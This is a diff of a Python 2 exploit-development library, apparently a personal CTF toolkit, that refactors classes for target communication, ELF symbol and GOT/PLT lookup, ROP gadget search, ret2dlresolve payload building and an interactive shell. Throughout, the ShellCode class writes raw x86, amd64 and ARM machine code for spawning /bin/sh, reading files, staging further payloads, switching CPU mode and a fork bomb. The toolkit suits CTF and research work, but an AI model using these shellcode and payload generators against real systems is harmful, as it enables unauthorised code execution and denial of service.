@@ -3,7 +3,6 @@ import sys
 import os
 from string import strip
 from struct import pack,unpack
-from thread import start_new_thread
 from base64 import b64encode, b64decode
 from time import sleep
 
@@ -44,7 +43,14 @@ pack_64     = lambda x:    pack('<Q' if x > 0 else '<q',x)
 unpack_16   = lambda x:    unpack('<H',x)[0]
 unpack_32   = lambda x:    unpack('<I',x)[0]
 unpack_64   = lambda x:    unpack('<Q',x)[0]
+rol         = lambda val, r_bits, max_bits: \
+              (val << r_bits%max_bits) & (2**max_bits-1) | \
+              ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+ror         = lambda val, r_bits, max_bits: \
+              ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
+              (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
 
+#==========
 
 color       = {'N':9,'R':1,'G':2,'Y':3,'B':4,'M':5,'C':6,'W':7}
 console     = {'bold'       : '\x1b[1m', \
@@ -59,14 +65,47 @@ proc        = lambda x:     message('G', '[*]', x)
 warn        = lambda x:     message('Y', '[!]', x)
 fail        = lambda x:     message('R', '[-]', x)
 
-#==========
-
 if os.name=='nt':
-    from colorama import init as color_init
-    color_init()
+    try:
+        from colorama import init as color_init
+        color_init()
+    except:
+        fail('module "colorama" is not importable')
 
 #==========
 
+class Environment:
+    def __init__(self, *envs):
+        self.__env = None
+        self.env_list = list(set(envs))
+        for env in self.env_list:
+            setattr(self, env, dict())
+
+    def set_item(self, name, **obj):
+        if obj.keys()!=self.env_list:
+            warn('environment name does not match')
+            return
+        
+        for env in obj:
+            getattr(self, env).update({name:obj[env]})
+
+    def select(self, env=None):
+        if env is not None and env not in self.env_list:
+            warn('"%s" is not defined' % env)
+            
+        while env is None or env not in self.env_list:
+            env = raw_input('Select Environment\n%s ...' % str(self.env_list))
+
+        info('set environment "%s"' % env)
+        for name,obj in getattr(self, env).items():
+            setattr(self, name, obj)
+        self.__env = env
+
+    def check(self, env):
+        return self.__env == env
+
+#==========
+            
 class Communicate:    
     def __init__(self, target, mode='SOCKET', disp=True, **args):
         self.disp = disp
@@ -156,8 +195,12 @@ class Communicate:
             self.show_mode = None
             
         if self.show_mode=='HEXDUMP' and self.hexdump is None:
-            from hexdump import hexdump
-            self.hexdump = hexdump
+            try:
+                from hexdump import hexdump
+                self.hexdump = hexdump
+            except:
+                fail('module "hexdump" is not importable')
+                self.show_mode = None;
 
     def show(self, c, t, data):
         sys.stdout.write(template % (console['c_color'](c), '\n[%s]' % t, ''))
@@ -234,21 +277,25 @@ class Communicate:
             self.show('Y', 'READ', rsp)
         return rsp
 
-    def read_until(self,term='\n'):
+    def read_until(self,term='\n',contain=True):
         rsp = ''
-        while not rsp.endswith(term):
-            try:
+        try:
+            while not rsp.endswith(term):
                 if self.mode=='SOCKET':
                     rsp += self.sock.recv(1) 
                 elif self.mode=='LOCAL':
                     rsp += self.proc.stdout.read(1)
                 elif self.mode=='SSH':
                     rsp += self.channel.recv(1)
-            except:
-                pass
+        except:
+            if not rsp.endswith(term):
+                warn('read_until: not end with "%s"(timeout)' % term)
         
         if self.show_mode is not None:
             self.show('Y', 'READ', rsp)
+            
+        if not contain:
+            rsp = rsp[:rsp.rfind(term)]
         return rsp
 
     def __del__(self):
@@ -267,30 +314,35 @@ class Communicate:
             self.channel.close()
             if self.disp:
                 proc('Session Disconnect...')
+        raw_input('Enter any key to continue...')
 
 #==========
 
 class ELF:
-    def __init__(self, path, rop=False):
-        from elftools.elf.elffile import ELFFile
-        from elftools.elf.sections import SymbolTableSection
+    def __init__(self, path, **args):
+        try:
+            from elftools.elf.elffile import ELFFile
+            from elftools.elf.sections import SymbolTableSection
 
-        self.__symbolTableSection = SymbolTableSection
+            self.__symbolTableSection = SymbolTableSection
+        except:
+            fail('module "elftools" is not importable')
+            return
 
         proc('Loading "%s"...' % path)
         self.elf    = ELFFile(open(path,'rb'))
         self.path   = path
         
-        self.arch   = self.elf.get_machine_arch().lower()        
+        self.arch   = self.elf.get_machine_arch().lower()
         self.pie    = 'DYN' in self.elf.header.e_type
-        self.base   = 0
+        self.base   = args['base'] if 'base' in args and self.pie else 0
         
         self.__section                  = self.init_sections()
         self.__got                      = self.init_got()
         self.__plt                      = self.init_plt()
         self.__symbol, self.__function  = self.init_symbols()
         
-        self.__list_gadgets             = self.init_ropgadget() if rop else None
+        self.__list_gadgets             = self.init_ropgadget() if 'rop' in args and args['rop'] else None
 
     def init_sections(self):
         self.__list_sections = list(self.elf.iter_sections())
@@ -301,7 +353,7 @@ class ELF:
         return section
 
     def init_got(self):
-        sec_rel_plt = self.elf.get_section_by_name('.rel.plt')
+        sec_rel_plt = self.elf.get_section_by_name('.rel.plt' if self.arch == 'x86' else '.rela.plt')
         sym_rel_plt = self.__list_sections[sec_rel_plt.header.sh_link]
 
         got = dict()
@@ -312,7 +364,7 @@ class ELF:
         return got
 
     def init_plt(self):
-        if self.arch in ('x86','amd64'):
+        if self.arch in ('x86','x64','amd64'):
             header_size, entry_size = 0x10, 0x10
                 
         sec_plt     = self.elf.get_section_by_name('.plt')
@@ -341,8 +393,12 @@ class ELF:
         return symbol, function
         
     def init_ropgadget(self):
-        from ropgadget.args import Args
-        from ropgadget.core import Core
+        try:
+            from ropgadget.args import Args
+            from ropgadget.core import Core
+        except:
+            fail('module "ropgadget" is not importable')
+            return None
 
         c = Core(Args(('--console',)).getArgs())
         c.do_binary(self.path, True)
@@ -362,9 +418,9 @@ class ELF:
             warn('Base address is already set')
 
         if symbol in self.__function:
-            self.base += addr - self.__function[symbol] 
+            self.base = addr - self.__function[symbol] 
         elif symbol in self.__symbol:
-            self.base += addr - self.__symbol[symbol]
+            self.base = addr - self.__symbol[symbol]
         else:
             fail('symbol "%s" not found' % symbol)
             return
@@ -385,18 +441,51 @@ class ELF:
         return None
 
     def section(self, name):
+        if self.pie and not self.base:
+            warn('Base address not set')
+            
+        if name is None:
+            return self.__section
+        elif name not in self.__section:
+            fail('section "%s" not found' % name)
+            return None
+        
         return self.base + self.__section[name]
 
     def plt(self, name):
+        if name is None:
+            return self.__plt
+        elif name not in self.__plt:
+            fail('plt "%s" not found' % name)
+            return None
+        
         return self.base + self.__plt[name]
 
     def got(self, name):
+        if name is None:
+            return self.__got
+        elif name not in self.__got:
+            fail('got "%s" not found' % name)
+            return None
+        
         return self.base + self.__got[name]
     
     def function(self, name):
+        if name is None:
+            return self.__function
+        elif name not in self.__function:
+            fail('function "%s" not found' % name)
+            return None
+        
         return self.base + self.__function[name]
 
     def symbol(self, name):
+        if name is None:
+            return self.__symbol
+        elif name not in self.__symbol:
+            fail('symbol "%s" not found' % name)
+            return None
+        
         return self.base + self.__symbol[name]
 
     def ropgadget(self, *keyword):
@@ -540,14 +629,14 @@ class DLresolve:
             dynstr += s+'\x00'
         
         addr_buf_dynsym      = addr_buf_dynstr + len(dynstr)
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             align_dynsym         = (0x10-(addr_buf_dynsym - self.addr_dynsym)%0x10)%0x10
         elif self.arch in ['x86_64','amd64']:
             align_dynsym         = (0x18-(addr_buf_dynsym - self.addr_dynsym)%0x18)%0x18
         addr_buf_dynsym     += align_dynsym
             
         for s,of in d.items():
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 dynsym  += pack_32(addr_buf_dynstr + of - self.addr_dynstr)
                 dynsym  += pack_32(0)
                 dynsym  += pack_32(0)
@@ -559,7 +648,7 @@ class DLresolve:
                 dynsym  += pack_64(0)
                 
         addr_buf_relplt      = addr_buf_dynsym + len(dynsym)
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             align_relplt     = 0
             r_info           = (addr_buf_dynsym - self.addr_dynsym) / 0x10
         elif self.arch in ['x86_64','amd64']:
@@ -571,7 +660,7 @@ class DLresolve:
             warn('check gnu version : [0x%08x] & 0x7fff' % (self.addr_version+r_info*2))
         
         for s,a in self.funcadr.items():
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 self.reloc_offset.update({s : addr_buf_relplt + len(relplt) -self.addr_relplt})
                 relplt  += pack_32(a)
                 relplt  += pack_32(r_info << 8 | 0x7)
@@ -606,16 +695,21 @@ class ShellCode:
             warn('ShellCode(init) : Architecture "%s" is not defined' % arch)
             info('ShellCode(init) : Set arch "x86"')
             arch = 'x86'
-           
+
+        self.init_sys_no(arch)
         self.arch       = arch
         self.max_len    = max_len
         self.null_free  = null_free
         self.initialized= False
 
-        if self.arch in ['x86','arm']:
+    def init_sys_no(self, arch):
+        if arch in ['x86','arm']:
             self.sys_no = {'exit':0x01, 'fork':0x02, 'read':0x03, 'write':0x04, 'open':0x05, 'close':0x06, 'execve':0x0b, 'dup2':0x3f, 'mmap':0x5a, 'mmap2':0xc0, 'munmap':0x5b, 'mprotect':0x7d, 'geteuid':0xc9, 'setreuid':0xcb}
-        elif self.arch in ['x86_64','amd64']:
+        elif arch in ['x86_64','amd64']:
             self.sys_no = {'exit':0x3c, 'fork':0x39, 'read':0x00, 'write':0x01, 'open':0x02, 'close':0x03, 'execve':0x3b, 'dup2':0x21, 'mmap':0x09, 'munmap':0x0b, 'mprotect':0x0a, 'geteuid':0x6b, 'setreuid':0x71}
+        else:
+            fail('cannot initialize systemcall number')
+            self.sys_no = None
 
     def get(self):
         return self.__shellcode
@@ -652,19 +746,54 @@ class ShellCode:
     def start(self):
         self.initialized = True
         asm = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             asm += ''
         elif self.arch in ['x86_64','amd64']:
             asm += ''
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             asm += "\x01\x30\x8f\xe3" # orr   r3, pc, 1
             asm += "\x13\xff\x2f\xe1" # bx    r3
+        return self.gen(asm)
+
+    def change_cpu_mode(self, nw_arch, change=True):
+        if nw_arch not in ['x86','x86_64','amd64']:
+            return ''
+        
+        asm = ''
+        if self.arch == 'x86':
+            if nw_arch == 'x86':
+                warn('CPU_mode is already "x86"')
+            elif nw_arch in ['x86_64','amd64']:
+                if change:
+                    info('chage CPU_mode "x86" to "amd64"')
+                    self.init_sys_no(nw_arch)
+                    self.arch = nw_arch
+                asm += '\x6a\x33'               # push 0x33
+                asm += '\xe8\x00\x00\x00\x00'   # call 0
+                asm += '\x83\x04\x24\x05'       # add dword ptr [esp], 0x5
+                asm += '\xcb'                   # retf
+        elif self.arch in ['x86_64','amd64']: 
+            if nw_arch == 'x86':
+                if change:
+                    info('chage CPU_mode "amd64" to "x86"')
+                    self.init_sys_no(nw_arch)
+                    self.arch = nw_arch
+                asm += '\xe8\x00\x00\x00\x00'   # call 0
+                asm += '\xc7\x44\x24\x04\x23\x00\x00\x00'
+                                                # mov dword ptr [rsp+4], 0x23
+                asm += '\x83\x04\x24\x0d'       # add dword ptr [rsp], 0xd
+                asm += '\xcb'                   # retf
+            elif nw_arch in ['x86_64','amd64']:
+                warn('CPU_mode is already "amd64"')
+        else:
+            fail('cannot change CPU_mode "%s" to "%s"' % (self.arch, nw_arch))
+            
         return self.gen(asm)
 
     def rval2arg(self,index):
         asm = ''
         if index<7:
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 ebx = 0xc3
                 d   = (0,2,1,5,4,6)
                 asm += '\x89'+chr(ebx^d[index-1])   # mov    ebx/ecx/edx/esi/edi/ebp, eax
@@ -674,7 +803,7 @@ class ShellCode:
                 prefix = ('\x48','\x48','\x48','\x49','\x49','\x49')
                 asm += prefix[index-1]+'\x89'+chr(rdi^d[index-1])
                                                     # mov    rdi/rsi/rdx/r10/r8/r9,  rax
-            elif self.arch is 'arm':
+            elif self.arch == 'arm':
                 if index > 1:
                     asm += chr(index-1)+'\x1c'      # adds   r1/r2/r3/r4/r5, r0, #0
         return self.gen(asm)
@@ -684,14 +813,14 @@ class ShellCode:
         for i in range(count):
             if self.arch in ['x86','x86_64','amd64']:
                 asm += '\x50'                       # push  eax/rax
-            elif self.arch is 'arm':
+            elif self.arch == 'arm':
                 asm += '\x01\xb4'                   # push  {r0}
         return self.gen(asm)
 
-    def pop_arg(self,index):
+    def pop2arg(self,index):
         asm=''
         if index<7:
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 ebx = 0x5b
                 d   = (0,2,1,5,4,6)
                 asm += chr(ebx^d[index-1])          # pop   ebx/ecx/edx/esi/edi/ebp
@@ -701,7 +830,7 @@ class ShellCode:
                 prefix = ('','','','\x41','\x41')
                 asm += prefix[index-1]+chr(rdi^d[index-1])
                                                     # pop   rdi/rsi/rdx/r10/r8/r9
-            elif self.arch is 'arm':
+            elif self.arch == 'arm':
                 asm += chr(2**(index-1))+'\xbc'     # pop   {r0/r1/r2/r3/r4/r5}
         return self.gen(asm)
 
@@ -710,7 +839,7 @@ class ShellCode:
         string += '\xff' if self.null_free else '\x00'
 
         asm = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             if self.null_free:
                 asm += '\xeb'+chr(0x6)              # jmp    0x6
                 asm += '\x8b\x04\x24'               # mov    eax,DWORD PTR [esp]
@@ -739,7 +868,7 @@ class ShellCode:
             else:
                 asm += '\x48\x8d\x05'+pack_32(2)    # lea    rax,[rip+0x5]
                 asm += '\xeb'+chr(len(string))      # jmp    len(string)
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             string += '\xff'*(len(string)%2)
             len_str = len(string)-1
             asm += '\x78\x46'                   # mov    r0, pc
@@ -763,7 +892,7 @@ class ShellCode:
             string = string[:-2]
                 
         asm = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             asm += '\x31\xff'                   # xor     edi, edi
             asm += '\x57'                       # push    edi
             for elm in arr:
@@ -788,7 +917,7 @@ class ShellCode:
                     if self.null_free:
                         asm += '\x44\x88\x40\xfe'       # mov    BYTE PTR [rax-0x2],r8b
             asm += '\x48\x89\xe0'               # mov     rax, rsp
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             asm += '\x64\x40'                   # eors    r4, r4
             asm += '\x10\xb4'                   # push    {r4}
             for elm in arr:
@@ -811,7 +940,7 @@ class ShellCode:
     def syscall(self,sys_no,args=[None]):
         args = args+[None]*(6-len(args))
         asm = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             ebx = (0xdb,0xbb)
             d   = (0,2,1,5,4,6)
             for i in range(6): 
@@ -851,7 +980,7 @@ class ShellCode:
             if sys_no:
                 asm += '\x04'+chr(sys_no&0xff)          # add    al, sys_no
             asm += '\x0f\x05'                       # syscall
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             for i in range(6):
                 if args[i] is not None:
                     v = args[i]
@@ -892,7 +1021,7 @@ class ShellCode:
         
     def open(self,fname,flags=O_RDONLY,mode=0644):
         # open(fname, flags)
-        if isinstance(fname, (int,long)):
+        if isinstance(fname, (int,long)) or fname is None:
             asm_fname = ''
         elif isinstance(fname, str):
             asm_fname  = self.str_addr(fname)
@@ -916,11 +1045,11 @@ class ShellCode:
             asm_fname += self.rval2arg(4 if save else 1)
             fname = None
         elif save and fname is None:
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 asm_fname += '\x89\xde'             # mov    esi, ebx
             elif self.arch in ['x86_64','amd64']:
                 asm_fname += '\x49\x89\xfa'         # mov    r10, rdi
-            elif self.arch is 'arm':
+            elif self.arch == 'arm':
                 asm_fname += '\x03\x1c'             # adds   r3, r0, #0
         
         if isinstance(argv, list):
@@ -935,21 +1064,21 @@ class ShellCode:
         asm = ''
         if fname is None:
             if save:
-                if self.arch is 'x86':
+                if self.arch == 'x86':
                     asm += '\x89\xf3'             # mov    ebx, esi
                 elif self.arch in ['x86_64','amd64']:
                     asm += '\x4c\x89\xd7'         # mov    rdi, r10
-                elif self.arch is 'arm':
+                elif self.arch == 'arm':
                     asm += '\x18\x1c'             # adds   r0, r3, #0
                     
             if argv is None:
-                if self.arch is 'x86':
+                if self.arch == 'x86':
                     asm += '\x80\xe9\x04'         # sub    cl, 0x4
                     asm += '\x89\x19'             # mov    DWORD PTR [ecx],ebx
                 elif self.arch in ['x86_64','amd64']:
                     asm += '\x40\x80\xee\x08'     # sub    sil, 0x8
                     asm += '\x48\x89\x3e'         # mov    QWORD PTR [rsi],rdi
-                elif self.arch is 'arm':
+                elif self.arch == 'arm':
                     asm += '\x41\xf8\x04\x0d'     # str.w   r0, [r1, #-4]!
             
         return asm_fname+asm_argv+asm_envp+self.gen(asm)+self.syscall(self.sys_no['execve'],[fname,argv,envp])
@@ -981,7 +1110,7 @@ class ShellCode:
     
     def sh(self,abridge_args=True):
         asm = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             asm +=  '\x31\xd2'                      # xor     edx, edx
             asm +=  '\x52'                          # push    edx
             asm +=  '\x68//sh'                      # push    0x68732f2f
@@ -993,7 +1122,7 @@ class ShellCode:
             asm += '\x53'                           # push    rbx
             asm += '\x48\x89\xe7'                   # mov     rdi, rsp
             asm += '\x48\x31\xd2'                   # xor     rdx, rdx
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             asm += '\x42\xf6\x2f\x70'               # movw    r0, #12079      ; 0x2f2f //
             asm += '\xc6\xf6\x62\x10'               # movt    r0, #26978      ; 0x6962 ib
             asm += '\x42\xf6\x6e\x71'               # movw    r1, #12142      ; 0x2f6e /n
@@ -1003,24 +1132,36 @@ class ShellCode:
             asm += '\x68\x46'                       # mov     r0, sp
         return self.gen(asm)+self.execve(None,NULL if abridge_args else [],None)
 
-    def read_file(self, fname, buf=None, size=0x501):
+    def read_file(self, fname, buf=None, size=0x500):
         asm = ''
         if buf is None:
-            asm += self.mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+            asm += self.mmap(NULL, 0x1000-size%0x1000+size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
             asm += self.push_rval(2)
             
         asm += self.open(fname)
         
         asm += self.rval2arg(1)
         if buf is None:
-            asm += self.pop_arg(2)
+            asm += self.pop2arg(2)
         asm += self.read(None,buf,size)
         
         asm += self.rval2arg(3)
         if buf is None:
-            asm += self.pop_arg(2)
+            asm += self.pop2arg(2)
         asm += self.write(STDOUT_FILENO,buf,None)
         return asm
+
+    def reset_stack(self, addr=NULL, size=0x1000):
+        asm = self.mmap(addr, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+        if self.arch in ['x86','x86_64','amd64']:
+            if self.arch == 'x86':
+                asm += '\x89\xc4'                   # mov    esp,eax
+            else:
+                asm += '\x48\x89\xc4'               # mov    rsp,rax
+            asm += '\x81\xc4'+pack_32(size-0x100)   # add    esp,size-0x100
+        else:
+            warn('not implemented')
+        return self.gen(asm)
 
     def stager(self, fd=STDIN_FILENO, buf=0, size=0x501):
         sc_tmp = ShellCode(self.arch, null_free=self.null_free)
@@ -1029,7 +1170,7 @@ class ShellCode:
         
         asm_1 = ''
         asm_2 = ''
-        if self.arch is 'x86':
+        if self.arch == 'x86':
             if buf==0:
                 buf = None
                 if self.null_free:
@@ -1051,7 +1192,7 @@ class ShellCode:
                 asm_1 += '\x40\x80\xc6'+chr(size_read+0xb)  # add    sil,len(read)+0xb
             else:
                 asm_2 += '\xff\xe6'                         # jmp    rsi
-        elif self.arch is 'arm':
+        elif self.arch == 'arm':
             if buf==0:
                 buf = None
                 asm_1 += '\x79\x46'                         # mov    r1, pc
@@ -1064,7 +1205,7 @@ class ShellCode:
     def fork_bomb(self,level=1):
         asm  = ''
         if level>0:
-            if self.arch is 'x86':
+            if self.arch == 'x86':
                 if level<3:
                     asm += '\x85\xc0'                       # test    eax, eax
                     asm += '\x0f'+chr(0x83+level)+'\x05\x00\x00\x00'
@@ -1080,7 +1221,7 @@ class ShellCode:
                     asm += '\xe9\xeb\xff\xff\xff'           # jmp     -21
                 else:
                     asm += '\xe9\xf4\xff\xff\xff'           # jmp     -12
-            elif self.arch is 'arm':
+            elif self.arch == 'arm':
                 if level<3:
                     asm += '\x00\x28'                       # cmp     r0, #0
                     asm += '\x00'+chr(0xcf+level)           # level1: beq.n 4 /   level2: bne.n 4
@@ -1336,20 +1477,25 @@ class Interact:
         self.cmn = cmn
 
     def worker(self, tty=False):
+        from thread import start_new_thread
         if not tty:
             fail('Not a TTY')
-            
+        
         start_new_thread(self.listener, ())
         self.sender(tty)
         
     def sender(self, tty):
         if tty:
-            import curses
+            try:
+                import curses
             
-            self.stdscr = curses.initscr()
-            curses.noecho()
-            curses.cbreak()
-            self.stdscr.keypad(True)
+                self.stdscr = curses.initscr()
+                curses.noecho()
+                curses.cbreak()
+                self.stdscr.keypad(True)
+            except:
+               fail('module "curses" is not importable')
+               tty = False
             
         keypad = {  'KEY_BACKSPACE' :'\x7f',
                     'KEY_UP'        :'\x1b\x5b\x41',
@@ -1372,6 +1518,8 @@ class Interact:
             curses.nocbreak()
             curses.echo()
             curses.endwin()
+
+        return tty
 
     def listener(self):
         while self.cmn.is_alive:
